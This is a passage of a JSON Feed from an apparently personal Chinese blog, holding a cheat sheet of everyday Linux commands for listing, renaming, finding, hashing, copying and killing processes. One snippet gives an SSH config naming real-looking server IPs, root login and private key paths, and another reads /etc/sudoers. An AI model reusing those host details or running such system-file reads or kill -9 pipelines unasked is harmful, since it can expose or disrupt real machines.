{
    "version": "https://jsonfeed.org/version/1",
    "title": "X_T",
    "description": "人生如逆旅，我亦是行人",
    "home_page_url": "http://www.n1h1l157.live",
    "items": [
        {
            "id": "http://www.n1h1l157.live/2023/05/19/SAFE/Linux/",
            "url": "http://www.n1h1l157.live/2023/05/19/SAFE/Linux/",
            "title": "Linux 命令",
            "date_published": "2023-05-18T16:00:00.000Z",
            "content_html": "<p>对爱情的渴望，对知识的追求，对人类苦难不可遏制的同情，这三种纯洁而无比强烈的激情支配着我的一生。</p>\n<h2 id=\"ls\"><a class=\"markdownIt-Anchor\" href=\"#ls\">#</a> ls</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">只显示文件夹</span></span><br><span class=\"line\">ls -d */</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20015.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#显示所有子文件夹的子文件</span><br><span class=\"line\">ls *<span class=\"comment\">/*</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20000.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#将下划线变为空格</span><br><span class=\"line\">ls | sed <span class=\"string\">&#x27;s/_/ /g&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20001.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#以点为分割取第一部分</span><br><span class=\"line\">ls | cut -d <span class=\"string\">&quot;.&quot;</span> -f <span class=\"number\">1</span> </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20002.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 选取切割后的第二列到最后一列</span><br><span class=\"line\">ls | cut -d <span class=\"string\">&quot;_&quot;</span> -f <span class=\"number\">2</span>- </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20003.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#对ls的输出结果添加前缀和后缀</span><br><span class=\"line\">ls | sed <span class=\"string\">&#x27;s/^/Save_/&#x27;</span> | sed <span class=\"string\">&#x27;s/$/_In_Path/&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20004.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 以点为分割，不包括最后一项</span><br><span class=\"line\">ls | cut -d <span class=\"string\">&#x27;.&#x27;</span> -f <span class=\"number\">1</span>-$(($(ls | head -n <span class=\"number\">1</span> | tr -dc <span class=\"string\">&#x27;.&#x27;</span> | wc -c)+<span class=\"number\">1</span>)) | rev | cut -d <span class=\"string\">&#x27;.&#x27;</span> -f <span class=\"number\">2</span>- | rev</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20005.png\" alt></p>\n<h2 id=\"cat\"><a class=\"markdownIt-Anchor\" href=\"#cat\">#</a> cat</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">cat</span>的结果中添加前缀和后缀</span></span><br><span class=\"line\">cat 1.txt | sed &#x27;s/^/mv /g;s/$/ ..\\/..\\/..\\/del_plg\\//g&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20006.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 删除文件前后所有的空格</span><br><span class=\"line\">cat <span class=\"number\">1.</span>txt | sed <span class=\"string\">&#x27;s/^[[:space:]]*//;s/[[:space:]]*$//&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20007.png\" alt></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 消除序号的影响</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> 1.txt | <span class=\"built_in\">cut</span> -d <span class=\"string\">&#x27;.&#x27;</span> -f 2 | sed <span class=\"string\">&#x27;s/^[[:space:]]*//&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20008.png\" alt></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 去掉空行</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> 1.txt | awk <span class=\"string\">&#x27; &#123;if ($0!=&quot;&quot;)print&#125;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20009.png\" alt></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 去掉文本的换行符，连文件末尾换行符也去掉</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> 1.txt | xargs <span class=\"built_in\">echo</span> -n </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20010.png\" alt></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 去掉文本的换行符，会保留文件末尾的换行符</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> 1.txt | xargs </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20011.png\" alt></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 去除空行和首处的空格</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> 1.txt | sed <span class=\"string\">&#x27;/^$/d&#x27;</span> | sed <span class=\"string\">&#x27;s/^[[:space:]]*//&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20012.png\" alt></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 将1.txt文件中每行第三个下划线后的单词的首字母变为大写</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> 1.txt | <span class=\"built_in\">cut</span> -d <span class=\"string\">&quot;_&quot;</span> -f 3- | awk <span class=\"string\">&#x27;&#123;print toupper(substr($0,1,1)) substr($0,2)&#125;&#x27;</span> | sed <span class=\"string\">&#x27;s/^/Lateral_Penetration_/g&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20013.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 将后缀改为.rule，去掉换行符，并cp到另外的目录</span><br><span class=\"line\">cat 1.txt | sed &#x27;s/.yaml//g;s/$/.rule/g;s/!/\\\\\\\\!/g&#x27; | xargs | sed &#x27;s/^/cp /g;s/$/ \\/Users\\/chentuo\\/Public\\/xxxxxx\\/插件运营\\/自动上传脚本\\/威胁防护CI_CD加密\\//g&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20014.png\" alt></p>\n<h2 id=\"for\"><a class=\"markdownIt-Anchor\" href=\"#for\">#</a> for</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">批量压缩文件</span></span><br><span class=\"line\">for dir in $(ls -d */); do zip -r &quot;$&#123;dir%/&#125;.zip&quot; &quot;$dir&quot;;done</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20016.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">批量修改文件名,将点替换为-</span></span><br><span class=\"line\">for file in *; do mv &quot;$file&quot; &quot;$&#123;file//./_&#125;&quot;; done</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20017.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">仅保留文件名中的最后6个字符</span></span><br><span class=\"line\">for file in *; do new_file_name=&quot;$&#123;file:(-6)&#125;&quot;;mv &quot;$file&quot; &quot;$new_file_name&quot;;done</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20018.png\" alt></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 批量修改文件名字</span></span><br><span class=\"line\">i=10000; <span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> *; <span class=\"keyword\">do</span> <span class=\"built_in\">mv</span> <span class=\"string\">&quot;<span class=\"variable\">$file</span>&quot;</span> <span class=\"string\">&quot;<span class=\"variable\">$i</span>&quot;</span>.jpeg; i=$((i+<span class=\"number\">1</span>)); <span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20019.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 批量增加前缀和删除前缀</span><br><span class=\"line\"><span class=\"keyword\">for</span> i in `ls` ; <span class=\"keyword\">do</span> mv <span class=\"string\">&quot;$i&quot;</span> <span class=\"string\">&quot;【前缀】$i&quot;</span>;done</span><br><span class=\"line\"><span class=\"keyword\">for</span> i in `ls` ; <span class=\"keyword\">do</span> mv <span class=\"string\">&quot;$i&quot;</span> `echo <span class=\"string\">&quot;$i&quot;</span> | cut -d <span class=\"string\">&quot;】&quot;</span> -f <span class=\"number\">2</span>-`;done</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20020.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 生成自己需要的循环的内容</span><br><span class=\"line\"><span class=\"keyword\">for</span> i in &#123;<span class=\"number\">20000.</span><span class=\"number\">.20130</span>&#125;;<span class=\"keyword\">do</span> echo <span class=\"string\">&#x27;![](/N1h1l157/Linux/&#x27;</span>$i<span class=\"number\">&#x27;.</span>png)<span class=\"string\">&#x27; &gt;&gt; 1.txt;done</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"find\"><a class=\"markdownIt-Anchor\" href=\"#find\">#</a> find</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">批量修改文件名，将空格替换为划线</span></span><br><span class=\"line\">find * -depth -name &#x27;* *&#x27; -execdir bash -c &#x27;mv &quot;$0&quot; &quot;$&#123;0// /-&#125;&quot;&#x27; &quot;&#123;&#125;&quot; \\;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20021.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 递归查找名为<span class=\"string\">&quot;here&quot;</span>的文件夹，并打印其完整路径</span><br><span class=\"line\">find . -type d -name <span class=\"string\">&quot;here&quot;</span> -print</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20022.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 搜索当前目录下此文件，包括各级子目录</span><br><span class=\"line\">find . -name <span class=\"string\">&quot;filename.txt&quot;</span> -print</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20023.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 列出当前目录下的所有文件</span><br><span class=\"line\">find . -type f -exec echo &#123;&#125; \\;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20024.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 过滤当前目录下的./image文件夹，打印其他目录下的所有文件</span><br><span class=\"line\">find . -path ./image -prune -o -type f -exec echo &#123;&#125; \\;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20025.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 过滤多文件</span><br><span class=\"line\">find . \\( -path ./image -o -path ./resource \\) -prune -o -type f -exec echo &#123;&#125; \\;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20026.png\" alt></p>\n<h2 id=\"rename\"><a class=\"markdownIt-Anchor\" href=\"#rename\">#</a> rename</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">重命名文件将-用.替换</span></span><br><span class=\"line\">rename &#x27;s/-/./g&#x27; *</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20027.png\" alt></p>\n<h2 id=\"du\"><a class=\"markdownIt-Anchor\" href=\"#du\">#</a> du</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">统计大小</span></span><br><span class=\"line\">du -sh * </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20063.png\" alt></p>\n<h2 id=\"scp\"><a class=\"markdownIt-Anchor\" href=\"#scp\">#</a> scp</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">scp免密设置 - sudo vim ~/.ssh/config</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置之后可以通过 ssh root@linux1 连接，并且免密</span></span><br><span class=\"line\">Host linux1</span><br><span class=\"line\">Hostname 1.117.52.219</span><br><span class=\"line\">User root</span><br><span class=\"line\">Port 2121</span><br><span class=\"line\">IdentityFile /etc/ssh/chentuo_cloud.pem</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者不设置 hostname,通过 ssh root@47.102.120.55 免密连接</span></span><br><span class=\"line\">Host 47.102.120.55</span><br><span class=\"line\">User root</span><br><span class=\"line\">Port 22</span><br><span class=\"line\">IdentityFile ~/.ssh/aliyun_1106_rsa</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20129.png\" alt></p>\n<h2 id=\"hash\"><a class=\"markdownIt-Anchor\" href=\"#hash\">#</a> hash</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">计算sha256值</span></span><br><span class=\"line\">shasum -a 256 filename-1.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20028.png\" alt></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 输出转为大写</span></span><br><span class=\"line\">shasum -a 256 filename-1.txt  | awk <span class=\"string\">&#x27;&#123;print toupper($0)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20029.png\" alt></p>\n<h2 id=\"jq\"><a class=\"markdownIt-Anchor\" href=\"#jq\">#</a> jq</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">json 格式标准化输出</span></span><br><span class=\"line\">cat 1.json | jq</span><br><span class=\"line\">jq . 1.json</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20030.png\" alt></p>\n<h2 id=\"curl\"><a class=\"markdownIt-Anchor\" href=\"#curl\">#</a> curl</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">curl如何走代理</span></span><br><span class=\"line\">curl --socks5 &quot;127.0.0.1:7890&quot; &quot;http://httpbin.org/ip&quot; </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查询某个ip的归属地</span></span><br><span class=\"line\">curl cip.cc/8.8.8.8</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20031.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20032.png\" alt></p>\n<h2 id=\"tr\"><a class=\"markdownIt-Anchor\" href=\"#tr\">#</a> tr</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">不打印消息拷贝</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">windows</span></span><br><span class=\"line\">cat ~/.ssh/id_ed25519.pub | clip</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">linux</span></span><br><span class=\"line\">xclip -sel clip &lt; ~/.ssh/id_ed25519.pub</span><br><span class=\"line\">cat /lib64/libm.so.6 | xclip -sel clip</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">mac</span></span><br><span class=\"line\">cat 1.json | pbcopy</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20033.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">mac</span></span><br><span class=\"line\">tr -d &#x27;\\n&#x27; &lt; ~/.ssh/id_rsa.pub | pbcopy</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20034.png\" alt></p>\n<h2 id=\"ps\"><a class=\"markdownIt-Anchor\" href=\"#ps\">#</a> ps</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前运行了哪些服务</span></span><br><span class=\"line\">ps -ef | grep Linux</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20035.png\" alt></p>\n<h2 id=\"conda\"><a class=\"markdownIt-Anchor\" href=\"#conda\">#</a> conda</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前有哪些环境</span></span><br><span class=\"line\">conda env list</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新建一个python3.7的conda环境</span></span><br><span class=\"line\">conda create -n test python=3.8</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20036.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 激活环境与退出环境</span><br><span class=\"line\">conda activate test</span><br><span class=\"line\">conda deactivate</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20037.png\" alt></p>\n<h2 id=\"uname\"><a class=\"markdownIt-Anchor\" href=\"#uname\">#</a> uname</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前核心版本号</span></span><br><span class=\"line\">uname -a </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前内核版本</span></span><br><span class=\"line\">uname -r </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20038.png\" alt></p>\n<h2 id=\"lsof\"><a class=\"markdownIt-Anchor\" href=\"#lsof\">#</a> lsof</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看端口是否被占用</span></span><br><span class=\"line\">lsof -i:10086</span><br><span class=\"line\">lsof -i:10086 | grep -v PID | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20039.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 杀掉80端口的进程</span><br><span class=\"line\">lsof -i:10086 | awk &#x27;&#123;print $2&#125;&#x27; | grep -v &#x27;PID&#x27; | uniq | xargs kill -9 </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20040.png\" alt></p>\n<h2 id=\"grep\"><a class=\"markdownIt-Anchor\" href=\"#grep\">#</a> grep</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">排除某字段，取前几行、后几行</span></span><br><span class=\"line\">cat url.txt | cut -d &#x27;:&#x27; -f 2 | sed &#x27;s/\\/\\///g&#x27;| grep -v url | uniq | tail -n 10 | head -n 10 | xargs open</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20041.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 去掉空行与注释行</span><br><span class=\"line\">sudo cat /etc/sudoers | grep -v &#x27;#&#x27; | grep -v &#x27;^\\s*$&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20042.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 批量过滤</span><br><span class=\"line\">cat .bash_history | grep -v <span class=\"string\">&quot;#\\|ls\\|cd\\|ll\\|clear\\|neofetch\\|man\\|sl&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20043.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 过滤出 uncompression 字段的文件是哪个</span><br><span class=\"line\">grep -lH <span class=\"string\">&quot;uncompression&quot;</span> *</span><br><span class=\"line\">grep -lH <span class=\"string\">&quot;人生困惑&quot;</span> *.md</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20044.png\" alt></p>\n<h2 id=\"cp\"><a class=\"markdownIt-Anchor\" href=\"#cp\">#</a> cp</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">复制多个具有相同规则的子文件夹中的内容到另外一个文件夹中</span> </span><br><span class=\"line\">cp -r *Trojan/* ../test</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20045.png\" alt></p>\n<h2 id=\"ln\"><a class=\"markdownIt-Anchor\" href=\"#ln\">#</a> ln</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">linux创建链接软命令,<span class=\"built_in\">ln</span> -s 源文件 目标文件</span></span><br><span class=\"line\">ln -s /usr/bin/whoami /usr/bin/n1h1l157</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-f命令的意思是强制执行,意味着如果不存在就执行创建,存在就执行覆盖掉</span></span><br><span class=\"line\">ln -sf /usr/bin/id /usr/bin/n1h1l157</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20046.png\" alt></p>\n<h2 id=\"vim\"><a class=\"markdownIt-Anchor\" href=\"#vim\">#</a> vim</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Linux所有行用vim进行前缀插入</span></span><br><span class=\"line\">:%s/^/Prefix</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20047.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20048.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span 